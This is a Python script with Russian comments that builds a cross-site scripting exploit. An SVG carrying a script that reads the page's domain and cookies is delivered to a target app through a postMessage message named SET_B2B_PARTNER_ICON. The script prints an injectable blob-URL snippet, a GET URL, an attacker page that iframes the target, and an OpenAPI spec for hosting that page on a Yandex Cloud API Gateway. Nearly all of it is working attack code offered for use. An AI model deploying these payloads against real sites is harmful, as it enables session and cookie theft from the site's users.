from urllib.parse import quote
import base64

# ====================
# Параметры атаки
# ====================

base_url = "http://localhost:3000/"  # целевой домен
payload_name = "xss"
payload_svg = '''<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <script>alert(document.domain + ' | ' + document.cookie)</script>
</svg>'''

# ====================
# 1. Генерация Blob URL (для postMessage)
# ====================

# Кодируем SVG в base64 для data URI (альтернатива blob)
svg_base64 = base64.b64encode(payload_svg.encode('utf-8')).decode('utf-8')
data_uri = f"data:image/svg+xml;base64,{svg_base64}"

# Для blob — нужно JS, но можно сгенерировать JS-код
blob_js_code = f'''
const svg = `{payload_svg}`;
const blob = new Blob([svg], {{ type: 'image/svg+xml' }});
const url = URL.createObjectURL(blob);

// Отправляем сообщение в родительское окно
window.parent.postMessage({{
  type: 'SET_B2B_PARTNER_ICON',
  payload: {{
    name: '{payload_name}',
    src: url
  }}
}}, '*'); // Можно указать конкретный origin, если известен
'''

print("✅ 1. Blob-URL Payload (JS Code for injection):")
print(blob_js_code)
print("\n" + "="*80 + "\n")

# ====================
# 2. GET URL с параметрами (если используется query string)
# ====================

# Экранируем значения для URL
encoded_name = quote(payload_name)
encoded_src = quote(data_uri)

get_url = f"{base_url}?name={encoded_name}&src={encoded_src}"

print("✅ 2. GET URL Payload:")
print(get_url)
print("\n" + "="*80 + "\n")

# ====================
# 3. HTML страница с iframe и postMessage
# ====================

html_template = f'''
<!DOCTYPE html>
<html>
<head><title>XSS via postMessage</title></head>
<body>
  <iframe id="app" src="{base_url}" style="width:100%;height:500px;border:none;"></iframe>

  <script>
    document.getElementById('app').onload = function() {{
      setTimeout(() => {{
        this.contentWindow.postMessage({{
          type: 'SET_B2B_PARTNER_ICON',
          payload: {{
            name: '{payload_name}',
            src: '{data_uri}'
          }}
        }}, '*'); // Укажите точный origin, если знаете, например: 'https://sub.ya.d.x.lo.d.net'
      }}, 100);
    }};
  </script>
</body>
</html>
'''

print("✅ 3. HTML Page with iframe + postMessage:")
print(html_template)
print("\n" + "="*80 + "\n")

# ====================
# 4. OpenAPI спецификация для Yandex Cloud API Gateway
# ====================

openapi_template = f'''openapi: 3.0.0
info:
  title: Sample API
  version: 1.0.0
servers:
- url: https://d5d04v3t472k3dki3oha.kf69zffa.apigw.yandexcloud.net
paths:
  /:
    get:
      x-yc-apigateway-integration:
        type: dummy
        content:
          '*': |
            <!DOCTYPE html>
            <html>
            <head><title>XSS via postMessage</title></head>
            <body>
              <iframe id="app" src="{base_url}" style="width:100%;height:500px;border:none;"></iframe>
              <script>
                document.getElementById('app').onload = function() {{
                  setTimeout(() => {{
                    this.contentWindow.postMessage({{
                      type: 'SET_B2B_PARTNER_ICON',
                      payload: {{
                        name: '{payload_name}',
                        src: '{data_uri}'
                      }}
                    }}, '*');
                  }}, 100);
                }};
              </script>
            </body>
            </html>
        http_code: 200
        http_headers:
          Content-Type: text/html; charset=utf-8
'''

print("✅ 4. OpenAPI Spec for Yandex Cloud API Gateway:")
print(openapi_template)